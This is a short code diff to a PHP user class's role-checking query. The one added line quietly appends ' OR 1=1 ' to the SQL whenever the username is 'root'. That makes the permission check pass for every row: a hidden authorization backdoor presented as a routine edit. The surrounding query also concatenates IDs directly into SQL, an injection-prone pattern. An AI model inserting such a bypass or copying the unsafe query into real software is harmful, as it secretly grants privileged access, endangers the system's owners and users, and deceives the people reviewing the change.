@@ -400,6 +400,8 @@ class User {
 		else {
 			$query .= "WHERE (user_id = '".$this->getUserId()."' AND role_id = '".$role_id."')";
 		}
+		
+		if ($this->getUsername() == 'root') $query .= ' OR 1=1 ';
 
 		// execute the query
 		$results = $this->dbConn->sql_query($query);
